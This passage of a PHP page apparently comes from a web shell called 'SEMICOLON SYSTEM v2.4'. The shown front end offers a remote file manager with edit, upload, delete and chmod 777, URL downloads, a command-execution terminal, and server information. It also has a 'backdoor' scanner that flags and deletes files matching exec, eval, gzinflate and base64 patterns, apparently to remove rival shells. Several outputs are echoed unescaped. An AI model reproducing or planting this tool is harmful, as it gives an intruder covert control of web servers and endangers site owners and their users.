        .bulk-actions { background: rgba(255, 0, 0, 0.1); border: 1px solid #ff0000; padding: 10px; margin: 10px 0; display: none; }
        .system-info-table { width: 100%; border-collapse: collapse; background: rgba(0, 10, 0, 0.9); margin: 10px 0; border: 1px solid #00ff00; }
        .system-info-table th { background: #002200; color: #00ff00; padding: 10px; border: 1px solid #00ff00; text-align: left; width: 30%; }
        .system-info-table td { padding: 10px; border: 1px solid #00ff00; background: #001100; color: #00ff00; font-size: 12px; }
        .bulk-chmod-section { background: rgba(0, 40, 0, 0.9); border: 1px solid #00ff00; padding: 15px; margin: 15px 0; border-radius: 5px; }
        .chmod-category { margin-bottom: 15px; }
        .chmod-category-title { color: #00ffff; font-size: 14px; margin-bottom: 8px; display: flex; align-items: center; }
        .chmod-options { display: flex; flex-wrap: wrap; gap: 8px; }
        .chmod-option-btn { background: #002200; color: #00ff00; border: 1px solid #00ff00; padding: 6px 12px; cursor: pointer; font-size: 11px; border-radius: 3px; white-space: nowrap; }
        .chmod-option-btn:hover { background: #00ff00; color: #000; }
        .chmod-option-btn.active { background: #00ff00; color: #000; font-weight: bold; }
        .chmod-custom-input { display: flex; align-items: center; gap: 10px; margin-top: 10px; padding-top: 10px; border-top: 1px solid #00ff00; }
        .chmod-custom-input input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 6px; width: 80px; font-family: 'Courier New'; }
        .quick-actions { display: flex; flex-wrap: wrap; gap: 5px; margin: 10px 0; }
        .quick-action-btn { background: #004400; color: #00ff00; border: 1px solid #00ff00; padding: 5px 10px; cursor: pointer; font-size: 11px; border-radius: 3px; }
        .quick-action-btn:hover { background: #00ff00; color: #000; }
        .scanner-risk-high { color: #ff0000 !important; font-weight: bold; }
        .scanner-risk-medium { color: #ff6600 !important; font-weight: bold; }
        .scanner-risk-low { color: #ffff00 !important; font-weight: bold; }
        .backdoor-actions { background: rgba(255, 0, 0, 0.2); padding: 10px; margin: 10px 0; border: 1px solid #ff0000; }
        .scan-info { background: rgba(0, 30, 0, 0.8); padding: 10px; margin: 10px 0; border: 1px solid #00ff00; border-radius: 5px; }
        @keyframes gridMove { 0% { transform: translate(0, 0); } 100% { transform: translate(50px, 50px); } }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="header">
        <div class="title">SEMICOLON SYSTEM v2.4</div>
        <a href="?logout=1" class="logout">LOGOUT</a>
    </div>
    
    <div class="tabs">
        <button class="tab <?php echo $current_tab == 'files' ? 'active' : ''; ?>" onclick="switchTab('files')">FILES</button>
        <button class="tab <?php echo $current_tab == 'terminal' ? 'active' : ''; ?>" onclick="switchTab('terminal')">TERMINAL</button>
        <button class="tab <?php echo $current_tab == 'scanner' ? 'active' : ''; ?>" onclick="switchTab('scanner')">🔍 SCANNER</button>
        <button class="tab <?php echo $current_tab == 'system' ? 'active' : ''; ?>" onclick="switchTab('system')">SYSTEM INFO</button>
        <?php if (isset($edit_path)): ?><button class="tab active">EDIT</button><?php endif; ?>
    </div>
    
    <?php
    $path_parts = []; $current_path = '';
    foreach (explode('/', trim($path, '/')) as $part) {
        if ($part) { $current_path .= '/' . $part;
            $path_parts[] = '<span class="path-link" onclick="navigateTo(\'' . $current_path . '\')">' . $part . '</span>';
        }
    }
    $path_links = '<span class="path-link" onclick="navigateTo(\'/\')">/</span>' . implode(' / ', $path_parts);
    
    $folders = []; $files = [];
    foreach (scandir($path) as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullpath = $path . '/' . $item;
        $item_data = [
            'name' => $item, 'path' => $fullpath, 'is_dir' => is_dir($fullpath),
            'size' => is_dir($fullpath) ? '-' : round(filesize($fullpath) / 1024, 2) . ' KB',
            'perms' => substr(sprintf('%o', fileperms($fullpath)), -4),
            'modified' => date('Y-m-d H:i:s', filemtime($fullpath))
        ];
        if ($item_data['is_dir']) $folders[] = $item_data; else $files[] = $item_data;
    }
    usort($folders, function($a, $b) { return strcmp($a['name'], $b['name']); });
    usort($files, function($a, $b) { return strcmp($a['name'], $b['name']); });
    ?>
    
    <div id="files-tab" class="tab-content <?php echo $current_tab == 'files' ? 'active' : ''; ?>">
        <div class="path-bar">Path: <?php echo $path_links; ?></div>
        <?php if (isset($_SESSION['error'])): ?>
            <div class="error-message"><?php echo $_SESSION['error']; unset($_SESSION['error']); ?></div>
        <?php endif; ?>
        <?php if (isset($_SESSION['success'])): ?>
            <div class="success-message"><?php echo $_SESSION['success']; unset($_SESSION['success']); ?></div>
        <?php endif; ?>
        
        <?php if (isset($_SESSION['bulk_chmod_report'])): ?>
            <div id="chmodReportModal" class="modal" style="display: block;">
                <div class="modal-content" style="max-width: 600px;">
                    <div class="modal-title">📊 BULK CHMOD REPORT</div>
                    <div id="chmodReportContent" style="max-height: 400px; overflow-y: auto; font-family: 'Courier New'; font-size: 12px;">
                        <?php 
                        $report = $_SESSION['bulk_chmod_report'];
                        foreach ($report as $line): 
                            if (strpos($line, '✅') !== false): ?>
                                <div style="color: #00ff00; margin: 5px 0;"><?php echo htmlspecialchars($line); ?></div>
                            <?php elseif (strpos($line, '❌') !== false): ?>
                                <div style="color: #ff0000; margin: 5px 0;"><?php echo htmlspecialchars($line); ?></div>
                            <?php else: ?>
                                <div style="color: #ffff00; margin: 5px 0; padding-left: 20px;"><?php echo htmlspecialchars($line); ?></div>
                            <?php endif;
                        endforeach; 
                        unset($_SESSION['bulk_chmod_report']);
                        ?>
                    </div>
                    <div style="display: flex; gap: 10px; margin-top: 20px;">
                        <button type="button" class="tool-btn" onclick="hideModal('chmodReportModal')">CLOSE</button>
                    </div>
                </div>
            </div>
        <?php endif; ?>
        
        <div class="tool-bar">
            <button class="tool-btn" onclick="showModal('uploadModal')">UPLOAD</button>
            <button class="tool-btn" onclick="showModal('createFileModal')">NEW FILE</button>
            <button class="tool-btn" onclick="showModal('createFolderModal')">NEW FOLDER</button>
            <button class="tool-btn" onclick="showModal('urlDownloadModal')">DOWNLOAD URL</button>
        </div>
        
        <div id="bulkActions" class="bulk-actions">
            <span style="color: #ff0000; margin-right: 15px;"><span id="selectedCount">0</span> selected</span>
            <button type="button" class="tool-btn" onclick="deleteSelected()">DELETE SELECTED</button>
            
            <div class="bulk-chmod-section" id="bulkChmodForm">
                <div style="color: #00ffff; font-size: 14px; margin-bottom: 10px;">
                    🔧 BULK CHMOD: <span id="selectedPermission" style="background: #00ff00; color: #000; padding: 2px 8px; border-radius: 3px;">644</span>
                </div>
                
                <div class="quick-actions">
                    <button class="quick-action-btn" onclick="setBulkPermission('644')">📄 Files (644)</button>
                    <button class="quick-action-btn" onclick="setBulkPermission('755')">📁 Folders (755)</button>
                    <button class="quick-action-btn" onclick="setBulkPermission('777')">🔥 Full Access (777)</button>
                    <button class="quick-action-btn" onclick="setBulkPermission('600')">🔒 Secure (600)</button>
                    <button class="quick-action-btn" onclick="setBulkPermission('444')">📖 Read Only (444)</button>
                </div>
                
                <div class="chmod-categories" style="margin-top: 15px;">
                    <?php $chmod_options = getChmodOptions(); ?>
                    <?php foreach ($chmod_options as $category => $options): ?>
                        <?php 
                        $category_titles = [
                            'folders' => '📁 Folders',
                            'files' => '📄 Files',
                            'secure' => '🔒 Secure',
                            'scripts' => '⚡ Scripts'
                        ];
                        ?>
                        <div class="chmod-category">
                            <div class="chmod-category-title">
                                <?php echo $category_titles[$category] ?? ucfirst($category); ?>
                            </div>
                            <div class="chmod-options">
                                <?php foreach ($options as $value => $label): ?>
                                    <button class="chmod-option-btn" 
                                            data-permission="<?php echo $value; ?>"
                                            onclick="setBulkPermission('<?php echo $value; ?>')">
                                        <?php echo $label; ?>
                                    </button>
                                <?php endforeach; ?>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
                
                <div class="chmod-custom-input">
                    <span style="color: #00ff00;">Custom:</span>
                    <input type="text" id="customPermission" placeholder="e.g., 755" maxlength="4" 
                           pattern="[0-7]{3,4}" style="width: 70px;">
                    <button class="quick-action-btn" onclick="setCustomPermission()">SET</button>
                    <button class="tool-btn" onclick="applyBulkChmod()" 
                            style="background: #00ff00; color: #000; font-weight: bold;">
                        ✅ APPLY CHMOD
                    </button>
                </div>
            </div>
        </div>
        
        <form id="bulkForm" method="post" style="display: none;">
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
            <input type="hidden" name="bulk_delete" value="1">
            <div id="selectedItemsContainer"></div>
        </form>
        <form id="bulkChmodFormHidden" method="post" style="display: none;">
            <input type="hidden" name="bulk_chmod" value="1">
            <input type="hidden" name="bulk_permission" id="hiddenBulkPermission">
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
            <div id="selectedChmodItemsContainer"></div>
        </form>
        
        <table class="file-table">
            <thead>
                <tr>
                    <th class="checkbox-cell"><input type="checkbox" onclick="selectAll()"></th>
                    <th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if ($path !== '/'): ?>
                <tr>
                    <td class="checkbox-cell">-</td>
                    <td>📁 <span class="dir" onclick="navigateTo('<?php echo dirname($path); ?>')">[PARENT]</span></td>
                    <td>-</td><td>-</td><td>-</td><td>-</td>
                </tr>
                <?php endif; ?>
                <?php foreach ($folders as $item): ?>
                <tr>
                    <td class="checkbox-cell"><input type="checkbox" class="item-checkbox" data-path="<?php echo htmlspecialchars($item['path']); ?>" onchange="toggleBulkActions()"></td>
                    <td>📁 <span class="dir" onclick="navigateTo('<?php echo $item['path']; ?>')"><?php echo htmlspecialchars($item['name']); ?>/</span></td>
                    <td><?php echo $item['size']; ?></td>
                    <td>
                        <input type="text" class="modal-input" id="perms_<?php echo md5($item['path']); ?>" value="<?php echo $item['perms']; ?>" style="width: 60px;">
                        <button class="action-btn" onclick="chmodFile('<?php echo $item['path']; ?>', 'perms_<?php echo md5($item['path']); ?>')">CHMOD</button>
                    </td>
                    <td><?php echo $item['modified']; ?></td>
                    <td class="actions">
                        <button class="action-btn" onclick="renameItem('<?php echo $item['path']; ?>', '<?php echo $item['name']; ?>')">RENAME</button>
                        <button class="action-btn" onclick="deleteItem('<?php echo $item['path']; ?>')">DELETE</button>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php foreach ($files as $item): ?>
                <tr>
                    <td class="checkbox-cell"><input type="checkbox" class="item-checkbox" data-path="<?php echo htmlspecialchars($item['path']); ?>" onchange="toggleBulkActions()"></td>
                    <td>📄 <span class="file"><?php echo htmlspecialchars($item['name']); ?></span></td>
                    <td><?php echo $item['size']; ?></td>
                    <td>
                        <input type="text" class="modal-input" id="perms_<?php echo md5($item['path']); ?>" value="<?php echo $item['perms']; ?>" style="width: 60px;">
                        <button class="action-btn" onclick="chmodFile('<?php echo $item['path']; ?>', 'perms_<?php echo md5($item['path']); ?>')">CHMOD</button>
                    </td>
                    <td><?php echo $item['modified']; ?></td>
                    <td class="actions">
                        <button class="action-btn" onclick="downloadFile('<?php echo $item['path']; ?>')">DOWNLOAD</button>
                        <button class="action-btn" onclick="editFile('<?php echo $item['path']; ?>')">EDIT</button>
                        <button class="action-btn" onclick="renameItem('<?php echo $item['path']; ?>', '<?php echo $item['name']; ?>')">RENAME</button>
                        <button class="action-btn" onclick="deleteItem('<?php echo $item['path']; ?>')">DELETE</button>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    
    <div id="terminal-tab" class="tab-content <?php echo $current_tab == 'terminal' ? 'active' : ''; ?>">
        <div class="path-bar">Terminal: <?php echo $path_links; ?></div>
        <div class="terminal-container" id="terminalOutput">
            <div class="terminal-output">SEMICOLON TERMINAL v2.4</div>
            <div class="terminal-output">Type: pwd, ls, whoami, id, date, cat [file], echo "text", help</div>
            <div class="terminal-output">Download: wget https://example.com/file.txt</div>
            <?php if (isset($_SESSION['terminal_output'])): ?>
                <div class="terminal-output">$ <?php echo htmlspecialchars($_SESSION['last_command']); ?></div>
                <div class="terminal-output"><?php echo nl2br(htmlspecialchars($_SESSION['terminal_output'])); ?></div>
                <?php unset($_SESSION['terminal_output']); ?>
            <?php endif; ?>
        </div>
        <form method="post" class="cmd-form" id="terminalForm">
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
            <span style="color: #00ff00; margin-right: 10px;">$</span>
            <input type="text" name="terminal_cmd" class="terminal-input" placeholder="Enter command..." required autofocus id="terminalInput">
            <button type="submit" class="tool-btn">EXECUTE</button>
        </form>
    </div>
    
    <div id="scanner-tab" class="tab-content <?php echo $current_tab == 'scanner' ? 'active' : ''; ?>">
        <div class="path-bar">🔍 SEMICOLON SCANNER v2.4</div>
        
        <?php if (isset($_SESSION['error'])): ?>
            <div class="error-message"><?php echo $_SESSION['error']; unset($_SESSION['error']); ?></div>
        <?php endif; ?>
        <?php if (isset($_SESSION['success'])): ?>
            <div class="success-message"><?php echo $_SESSION['success']; unset($_SESSION['success']); ?></div>
        <?php endif; ?>

        <div class="scan-info">
            <h3 style="color: #00ff00; margin-bottom: 15px;">🚀 QUICK FILE CHECK</h3>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
                <input type="text" name="file_path" class="modal-input" 
                       value="<?php echo htmlspecialchars($path); ?>" 
                       placeholder="File path to check" style="width: 70%;">
                <button type="submit" name="quick_check" class="tool-btn">CHECK FILE</button>
            </form>
            
            <?php if (isset($_SESSION['quick_check_result'])): ?>
                <div style="margin-top: 15px; padding: 10px; background: #001100; border: 1px solid #00ff00;">
                    <strong>File:</strong> <?php echo htmlspecialchars($_SESSION['checked_file']); ?><br>
                    <strong>Result:</strong> 
                    <span style="color: <?php echo strpos($_SESSION['quick_check_result'], 'SUSPECT') !== false ? '#ff0000' : '#00ff00'; ?>">
                        <?php echo htmlspecialchars($_SESSION['quick_check_result']); ?>
                    </span>
                </div>
                <?php unset($_SESSION['quick_check_result']); ?>
            <?php endif; ?>
        </div>

        <div class="scan-info">
            <h3 style="color: #00ff00; margin-bottom: 15px;">🔍 FULL DIRECTORY SCAN</h3>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
                <div style="margin-bottom: 15px;">
                    <label style="color: #00ff00;">Scan Path:</label>
                    <input type="text" name="scan_path" class="modal-input" 
                           value="<?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? $path); ?>" 
                           style="width: 60%;">
                </div>
                <div style="margin-bottom: 15px;">
                    <label style="color: #00ff00;">Scan Type:</label>
                    <select name="scan_type" class="modal-input">
                        <option value="quick">⚡ Quick Scan (3 levels, 500 files)</option>
                        <option value="deep">🔍 Deep Scan (10 levels, 1500 files)</option>
                    </select>
                </div>
                <button type="submit" name="start_scan" class="tool-btn" 
                        onclick="return confirm('Start scanning? Quick: 2-5s, Deep: 15-30s')">
                    START SCAN
                </button>
            </form>
        </div>

        <?php if (isset($_SESSION['scan_results'])): ?>
            <?php $results = $_SESSION['scan_results']; ?>
            <div style="background: rgba(30, 0, 0, 0.8); border: 2px solid #ff0000; padding: 20px; border-radius: 5px;">
                <h3 style="color: #ff0000; margin-bottom: 15px;">
                    📊 SCAN RESULTS 
                    <span style="font-size: 12px; color: #00ff00;">
                        (Scanned: <?php echo $results['file_count']; ?> files, 
                        Directories: <?php echo $results['scanned_dirs']; ?>, 
                        Time: <?php echo $results['scan_time']; ?>s)
                    </span>
                </h3>
                
                <?php if (empty($results['suspicious_files'])): ?>
                    <div style="color: #00ff00; text-align: center; padding: 20px;">
                        ✅ No suspicious files found!
                    </div>
                <?php else: ?>
                    <div class="backdoor-actions">
                        <strong style="color: #ff0000;">⚠️ Found <?php echo count($results['suspicious_files']); ?> suspicious files!</strong>
                        <form method="post" id="bulkBackdoorForm" style="margin-top: 10px;">
                            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
                            <button type="button" class="tool-btn" onclick="selectAllBackdoors()">SELECT ALL</button>
                            <button type="submit" name="delete_selected_backdoors" class="tool-btn" 
                                    onclick="return confirm('Delete ALL selected backdoors? This action cannot be undone!')">
                                🗑️ DELETE SELECTED
                            </button>
                        </form>
                    </div>
                    
                    <table class="file-table">
                        <thead>
                            <tr>
                                <th class="checkbox-cell"><input type="checkbox" onclick="selectAllBackdoors()"></th>
                                <th>File</th>
                                <th>Risk Score</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Detected Patterns</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($results['suspicious_files'] as $index => $file): ?>
                            <tr>
                                <td class="checkbox-cell">
                                    <input type="checkbox" name="backdoor_files[]" value="<?php echo htmlspecialchars($file['path']); ?>" 
                                           form="bulkBackdoorForm" class="backdoor-checkbox">
                                </td>
                                <td style="color: #ff6666; font-size: 12px;">
                                    <?php echo htmlspecialchars($file['path']); ?>
                                </td>
                                <td>
                                    <span class="
                                        <?php echo $file['score'] >= 20 ? 'scanner-risk-high' : 
                                               ($file['score'] >= 15 ? 'scanner-risk-medium' : 'scanner-risk-low'); ?>">
                                        <?php echo $file['score']; ?>
                                    </span>
                                </td>
                                <td><?php echo $file['size']; ?></td>
                                <td><?php echo $file['permissions']; ?></td>
                                <td>
                                    <small style="color: #ff9999;">
                                        <?php echo implode(', ', array_slice($file['patterns'], 0, 3)); ?>
                                        <?php if (count($file['patterns']) > 3): ?>...<?php endif; ?>
                                    </small>
                                </td>
                                <td class="actions">
                                    <button class="action-btn" onclick="editFile('<?php echo $file['path']; ?>')">EDIT</button>
                                    <button class="action-btn" onclick="secureFile('<?php echo $file['path']; ?>')">SECURE</button>
                                    <form method="post" style="display: inline;">
                                        <input type="hidden" name="backdoor_path" value="<?php echo htmlspecialchars($file['path']); ?>">
                                        <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
                                        <button type="submit" name="delete_backdoor" class="action-btn" 
                                                onclick="return confirm('DELETE this backdoor?\n\n<?php echo htmlspecialchars($file['path']); ?>')">
                                            🗑️ DELETE
                                        </button>
                                    </form>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            </div>
            <?php unset($_SESSION['scan_results']); ?>
        <?php endif; ?>

        <div class="scan-info">
            <h4 style="color: #00ff00;">ℹ️ SEMICOLON SCANNER INFORMATION</h4>
            <div style="font-size: 12px; color: #00ff00;">
                <strong>⚡ Performance:</strong> Quick Scan (2-5s) | Deep Scan (15-30s)<br>
                <strong>🔍 Detection:</strong> exec(), gzinflate(), file_put_contents(), system(), passthru(), shell_exec(), eval(), base64<br>
                <strong>📁 Limits:</strong> Max 500 files (Quick) / 1500 files (Deep) | Max 500KB per file<br>
                <strong>🎯 Accuracy:</strong> Advanced pattern matching with risk scoring<br>
                <strong>⚠️ Warning:</strong> Always verify before deletion. Some detections may be false positives.
            </div>
        </div>
    </div>
    
    <div id="system-tab" class="tab-content <?php echo $current_tab == 'system' ? 'active' : ''; ?>">
        <div class="path-bar">📊 SYSTEM INFORMATION v2.4</div>
        <?php $system_info = getSystemInfo(); ?>
        <h3 style="color: #00ff00; margin: 20px 0 10px 0;">🖥️ SERVER INFORMATION</h3>
        <table class="system-info-table">
            <?php foreach ($system_info['server'] as $key => $value): ?>
            <tr><th><?php echo $key; ?></th><td><?php echo htmlspecialchars($value); ?></td></tr>
            <?php endforeach; ?>
        </table>
        <h3 style="color: #00ff00; margin: 20px 0 10px 0;">⚡ PHP CONFIGURATION</h3>
        <table class="system-info-table">
            <?php foreach ($system_info['php'] as $key => $value): ?>
            <tr><th><?php echo $key; ?></th><td><?php echo htmlspecialchars($value); ?></td></tr>
            <?php endforeach; ?>
        </table>
        <h3 style="color: #00ff00; margin: 20px 0 10px 0;">📊 SYSTEM RESOURCES</h3>
        <table class="system-info-table">
            <?php foreach ($system_info['resources'] as $key => $value): ?>
            <tr><th><?php echo $key; ?></th><td><?php echo htmlspecialchars($value); ?></td></tr>
            <?php endforeach; ?>
        </table>
        <h3 style="color: #00ff00; margin: 20px 0 10px 0;">🔐 SECURITY STATUS</h3>
        <table class="system-info-table">
            <tr><th>Authentication System</th><td style="color: #00ff00;">✅ WORKER-BASED (v2.4)</td></tr>
            <tr><th>Worker Status</th><td style="color: #00ff00;">● ONLINE</td></tr>
            <tr><th>Your IP Address</th><td><?php echo $_SERVER['REMOTE_ADDR']; ?></td></tr>
            <tr><th>Session Started</th><td><?php echo date('Y-m-d H:i:s', $_SESSION['auth_time'] ?? time()); ?></td></tr>
        </table>
    </div>
    
    <?php if (isset($edit_path)): ?>
    <div id="edit-tab" class="tab-content active">
        <div class="path-bar">Editing: <?php echo htmlspecialchars($edit_path); ?></div>
        <form method="post">
            <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($edit_path); ?>">
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">
            <textarea name="file_content" class="edit-textarea" placeholder="File content..."><?php echo $file_content; ?></textarea>
            <div class="tool-bar">
                <button type="submit" name="edit_file" class="tool-btn">SAVE</button>
                <button type="button" class="tool-btn" onclick="switchTab('files')">CANCEL</button>
            </div>
        </form>
    </div>
    <?php endif; ?>
    
    <!-- Modal Windows -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <div class="modal-title">UPLOAD FILES</div>
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="current_path" value="<?php echo $path; ?>">
                <input type="file" name="files[]" multiple required style="color: #00ff00;">
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <button type="submit" name="upload" class="tool-btn">UPLOAD</button>
                    <button type="button" class="tool-btn" onclick="hideModal('uploadModal')">CANCEL</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="urlDownloadModal" class="modal">
        <div class="modal-content">
            <div class="modal-title">DOWNLOAD FROM URL</div>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo $path; ?>">
                <input type="url" name="download_url" class="modal-input" placeholder="https://example.com/file.txt" required>
                <input type="text" name="filename" class="modal-input" placeholder="filename.txt (optional)">
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <button type="submit" name="download_url_submit" class="tool-btn">DOWNLOAD</button>
                    <button type="button" class="tool-btn" onclick="hideModal('urlDownloadModal')">CANCEL</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-title">RENAME</div>
            <form method="post">
                <input type="hidden" name="old_path" id="renameOldPath">
                <input type="hidden" name="current_path" id="renameCurrentPath" value="<?php echo htmlspecialchars($path); ?>">
                <input type="text" name="new_name" class="modal-input" id="renameNewName" placeholder="New name" required>
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <button type="submit" name="rename" class="tool-btn">RENAME</button>
                    <button type="button" class="tool-btn" onclick="hideModal('renameModal')">CANCEL</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <div class="modal-title">CREATE FILE</div>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo $path; ?>">
                <input type="text" name="filename" class="modal-input" placeholder="filename.txt" required>
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <button type="submit" name="create_file" class="tool-btn">CREATE</button>
                    <button type="button" class="tool-btn" onclick="hideModal('createFileModal')">CANCEL</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <div class="modal-title">CREATE FOLDER</div>
            <form method="post">
                <input type="hidden" name="current_path" value="<?php echo $path; ?>">
                <input type="text" name="foldername" class="modal-input" placeholder="foldername" required>
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <button type="submit" name="create_folder" class="tool-btn">CREATE</button>
                    <button type="button" class="tool-btn" onclick="hideModal('createFolderModal')">CANCEL</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        let currentPermission = '644';
        
        function switchTab(tabName) {
            window.location.href = '?tab=' + tabName + '&path=' + encodeURIComponent('<?php echo $path; ?>');
        }
        
        function navigateTo(newPath) {
            window.location.href = '?path=' + encodeURIComponent(newPath) + '&tab=files';
        }
        
        function showModal(modalId) {
            document.getElementById(modalId).style.display = 'block';
        }
        
        function hideModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        
        function editFile(filePath) {
            window.location.href = '?edit=' + encodeURIComponent(filePath) + '&path=' + encodeURIComponent('<?php echo $path; ?>');
        }
        
        function renameItem(oldPath, oldName) {
            document.getElementById('renameOldPath').value = oldPath;
            document.getElementById('renameCurrentPath').value = '<?php echo htmlspecialchars($path); ?>';
            document.getElementById('renameNewName').value = oldName;
            showModal('renameModal');
        }
        
        function deleteItem(path) {
            if (confirm('Delete: ' + path + '?')) {
                window.location.href = '?delete=' + encodeURIComponent(path) + 
                                      '&current_path=' + encodeURIComponent('<?php echo $path; ?>') + 
                                      '&tab=files';
            }
        }
        
        function downloadFile(path) {
            window.location.href = '?download=' + encodeURIComponent(path);
        }
        
        function secureFile(path) {
            if (confirm('Secure file (chmod 644): ' + path + '?')) {
                const form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = `<input type="hidden" name="chmod" value="1">
                    <input type="hidden" name="chmod_path" value="${path}">
                    <input type="hidden" name="permission" value="644">
                    <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">`;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function chmodFile(path, inputId) {
            const permission = document.getElementById(inputId).value;
            if (!/^[0-7]{3,4}$/.test(permission)) {
                alert('Invalid permission format. Use 3-4 digit octal number.');
                return;
            }
            if (confirm('Change permissions to ' + permission + ' for:\n' + path)) {
                const form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = `<input type="hidden" name="chmod" value="1">
                    <input type="hidden" name="chmod_path" value="${path}">
                    <input type="hidden" name="permission" value="${permission}">
                    <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>">`;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function setBulkPermission(perm) {
            currentPermission = perm;
            document.getElementById('selectedPermission').textContent = perm;
            document.getElementById('hiddenBulkPermission').value = perm;
            document.querySelectorAll('.chmod-option-btn').forEach(btn => {
                btn.classList.remove('active');
                if (btn.getAttribute('data-permission') === perm) {
                    btn.classList.add('active');
                }
            });
            document.querySelectorAll('.quick-action-btn').forEach(btn => {
                if (btn.textContent.includes('(' + perm + ')')) {
                    btn.style.background = '#00ff00';
                    btn.style.color = '#000';
                } else {
                    btn.style.background = '';
                    btn.style.color = '';
                }
            });
            document.getElementById('customPermission').value = perm;
        }
        
        function setCustomPermission() {
            const customPerm = document.getElementById('customPermission').value.trim();
            if (!/^[0-7]{3,4}$/.test(customPerm)) {
                alert('Invalid permission format. Use 3-4 digit octal number (0-7).');
                return;
            }
            setBulkPermission(customPerm);
        }
        
        function autoDetectPermission() {
            const checkboxes = document.querySelectorAll('.item-checkbox:checked');
            let hasFolders = false;
            let hasFiles = false;
            checkboxes.forEach(cb => {
                const row = cb.closest('tr');
                if (row) {
                    const nameCell = row.querySelector('td:nth-child(2)');
                    if (nameCell && nameCell.innerHTML.includes('📁')) {
                        hasFolders = true;
                    } else {
                        hasFiles = true;
                    }
                }
            });
            if (hasFolders && !hasFiles) {
                setBulkPermission('755');
            } else if (hasFiles && !hasFolders) {
                setBulkPermission('644');
            } else if (hasFolders && hasFiles) {
                setBulkPermission('755');
            }
        }
        
        function toggleBulkActions() {
            const checkboxes = document.querySelectorAll('.item-checkbox:checked');
            const bulkActions = document.getElementById('bulkActions');
            const bulkChmodForm = document.getElementById('bulkChmodForm');
            const selectedCount = document.getElementById('selectedCount');
            selectedCount.textContent = checkboxes.length;
            bulkActions.style.display = checkboxes.length > 0 ? 'block' : 'none';
            bulkChmodForm.style.display = checkboxes.length > 0 ? 'block' : 'none';
            if (checkboxes.length > 0) {
                autoDetectPermission();
            }
        }
        
        function selectAll() {
            const checkboxes = document.querySelectorAll('.item-checkbox');
            const selectAll = document.querySelector('thead .checkbox-cell input[type="checkbox"]');
            const isChecked = selectAll.checked;
            checkboxes.forEach(cb => cb.checked = isChecked);
            toggleBulkActions();
        }
        
        function selectAllBackdoors() {
            const checkboxes = document.querySelectorAll('.backdoor-checkbox');
            const allChecked = checkboxes.length > 0 && Array.from(checkboxes).every(cb => cb.checked);
            checkboxes.forEach(cb => cb.checked = !allChecked);
        }
        
        function deleteSelected() {
            const checkboxes = document.querySelectorAll('.item-checkbox:checked');
            if (checkboxes.length === 0) {
                alert('No items selected');
                return;
            }
            if (confirm(`Delete ${checkboxes.length} items?`)) {
                const container = document.getElementById('selectedItemsContainer');
                container.innerHTML = '';
                checkboxes.forEach((checkbox, index) => {
                    const path = checkbox.getAttribute('data-path');
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = `selected_items[${index}]`;
                    input.value = path;
                    container.appendChild(input);
                });
                document.getElementById('bulkForm').submit();
            }
        }
        
        function applyBulkChmod() {
            const checkboxes = document.querySelectorAll('.item-checkbox:checked');
            const permission = currentPermission;
            if (checkboxes.length === 0) {
                alert('❌ No items selected');
                return;
            }
            if (!/^[0-7]{3,4}$/.test(permission)) {
                alert('Invalid permission format.');
                return;
            }
            const permName = {
                '755': 'Standard Folder (rwxr-xr-x)',
                '644': 'Standard File (rw-r--r--)',
                '777': 'Full Access (rwxrwxrwx)',
                '600': 'Owner Only (rw-------)',
                '444': 'Read Only (r--r--r--)',
                '775': 'Shared Folder (rwxrwxr-x)',
                '664': 'Writable by Group (rw-rw-r--)',
                '750': 'Owner & Group (rwxr-x---)'
            }[permission] || `Permission ${permission}`;
            if (confirm(`Apply ${permName} to ${checkboxes.length} selected items?\n\nThis will change file permissions permanently.`)) {
                const form = document.getElementById('bulkChmodFormHidden');
                const container = document.getElementById('selectedChmodItemsContainer');
                container.innerHTML = '';
                checkboxes.forEach((checkbox, index) => {
